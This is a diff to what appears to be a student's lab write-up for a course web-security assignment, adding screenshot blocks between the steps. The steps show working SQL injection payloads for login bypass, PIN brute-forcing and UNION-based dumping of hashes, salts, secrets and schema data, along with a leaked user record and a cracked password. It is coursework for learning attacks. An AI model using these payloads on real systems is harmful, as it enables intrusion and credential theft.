@@ -23,10 +23,28 @@ To run the tests:
   - username: `hulamart';#`
   - password: `<any string>`
 
+<details>
+<summary>
+<b>SCREENSHOT</b>
+</summary>
+
+![Task1](/images/task1.png)
+
+</details>
+
   Resulting SQL query: 
   ```sql
   SELECT username FROM users WHERE username = 'hulamart';#' AND password = SHA1('<any string>' . '$salt')
   ```
+  
+<details>
+<summary>
+<b>SCREENSHOT</b>
+</summary>
+
+![Task1](/images/task1_2.png)
+
+</details>
 
 ## Task 2: Find out your PIN
   Extending the previous query and adding a requirement on correct PIN, we can find each correct pin digit in <=9 tries. 
@@ -34,12 +52,47 @@ To run the tests:
   Iteration 1:
   - username: `hulamart' AND pin LIKE '____';#`
   - password: `<any string>`
+  
 ```sql
   SELECT username FROM users WHERE username = 'hulamart' AND pin LIKE '____';#' AND password = SHA1('<any string>' . '$salt')
   ```
   Trying ```LIKE '0___'```, ```LIKE '1___'```, ```LIKE '2___'```. If it's possible to login, the digit is correct.
   
+<details>
+<summary>
+<b>SCREENSHOT</b>
+</summary>
+
+![Task2](/images/task2_1.png)
+
+</details>
+
+<details>
+<summary>
+<b>SCREENSHOT - not possible</b>
+</summary>
+
+![Task2](/images/task2_2.png)
+
+</details>
+
   Possible to login for ```LIKE '6___'```.
+  
+<details>
+<summary>
+<b>SCREENSHOT - correct digit</b>
+</summary>
+   
+![Task2](/images/task2_3.png)
+</details>
+ 
+<details>
+<summary>
+<b>SCREENSHOT - possible</b>
+</summary>
+   
+![Task2](/images/task2_4.png)
+</details>
 
   Iteration 2:
   - username: `hulamart' AND pin LIKE '6___';#`
@@ -66,14 +119,43 @@ To run the tests:
 
   - username: `idontexist' UNION SELECT secret as username FROM users WHERE username = 'hulamart';#`
   - password: `<any string>`
+  
+<details>
+<summary>
+<b>SCREENSHOT</b>
+</summary>
+
+![Task3](/images/task3.png)
+
+</details>
 
 ```sql
   SELECT username FROM users WHERE username = 'idontexist' 
   UNION SELECT secret as username FROM users WHERE username = 'hulamart';#' AND password = SHA1('<any string>' . '$salt')
   ```
   Safely assuming that user *idontexist* does not exist, the only returned value will be the secret and it will be displayed in the PIN page.
+  
+<details>
+<summary>
+<b>SCREENSHOT</b>
+</summary>
+
+![Task3](/images/task3_2.png)
+
+</details>
 
   Registering Google Authenticator with this secret value will allow us to use it to generate one-time passwords.
+  
+  And we're successfully logged in the system!
+
+<details>
+<summary>
+<b>SCREENSHOT</b>
+</summary>
+
+![Task3](/images/task3_3.png)
+
+</details>
 
 ## Task 4: Exfiltrate a list of all usernames, passwords, salts, secrets and pins
   For this task we'll use a vulnerability to SQL Injection in the GET parameter *offset* in the URL.
@@ -94,6 +176,15 @@ To run the tests:
   ```
   
   This will print all username, password, salt, secret and pin values separated by a semi-colon just below the original message in messages.
+  
+<details>
+<summary>
+<b>SCREENSHOT</b>
+</summary>
+
+![Task4](/images/task4_1.png)
+
+</details>
 
   The data is as follows:
   ```
@@ -155,6 +246,15 @@ vankope6;043e058894d0e34d13767d0d976dc1d34766368c;7e284;UNOFIJ3EDBIUNILS;2186
   Subtracting the salt we get the plaintext password:
 
   - plaintext password: `fm9fytmf7q`
+  
+<details>
+<summary>
+<b>SCREENSHOT</b>
+</summary>
+
+![Task6](/images/task6.png)
+
+</details>
 
 
   **task5.test.js**
@@ -188,6 +288,15 @@ vankope6;043e058894d0e34d13767d0d976dc1d34766368c;7e284;UNOFIJ3EDBIUNILS;2186
   messages;57
   users;19 
   ```
+  
+<details>
+<summary>
+<b>SCREENSHOT</b>
+</summary>
+
+![Task8](/images/task8_1.png)
+
+</details>
 
   Now we can query for columns of each of the tables. We create and execute three queries, one for each table:
   
@@ -203,11 +312,21 @@ vankope6;043e058894d0e34d13767d0d976dc1d34766368c;7e284;UNOFIJ3EDBIUNILS;2186
   aes_encrypt_code
   ```
 
+<details>
+<summary>
+<b>SCREENSHOT</b>
+</summary>
+
+![Task8](/images/task8_2.png)
+
+</details>
+
   **Messages**
   ```
   https://kbe.felk.cvut.cz/index.php?offset=0 
   UNION SELECT Column_name as datetime, 1 FROM INFORMATION_SCHEMA.COLUMNS where table_name like 'messages'
   ```
+ 
 
   This prints columns of 'messages' table:
   ```
@@ -247,6 +366,15 @@ vankope6;043e058894d0e34d13767d0d976dc1d34766368c;7e284;UNOFIJ3EDBIUNILS;2186
 
   LwoeM0dFDTdSRxBCfwoOCX9UX0AQFgAFcUs2DT5KE0NEMQ4GRTldQhJEEApSMQ4dDX9QW1ZdMw4MAjpBHg==
   ```
+  
+<details>
+<summary>
+<b>SCREENSHOT</b>
+</summary>
+
+![Task9](/images/task9.png)
+
+</details>
 
   For the plaintexts, we can find these directly in the website. We simply inspect the HTML of each message, one message per page. Assuming each message directly contains the html tags, we get the messages:
   ```
@@ -276,6 +404,7 @@ vankope6;043e058894d0e34d13767d0d976dc1d34766368c;7e284;UNOFIJ3EDBIUNILS;2186
   K = C ⊕ A
   =>
   (C ⊕ A) ⊕ A = C
+  =>
   K ⊕ A = C
 
   Which corresponds to our equation above.
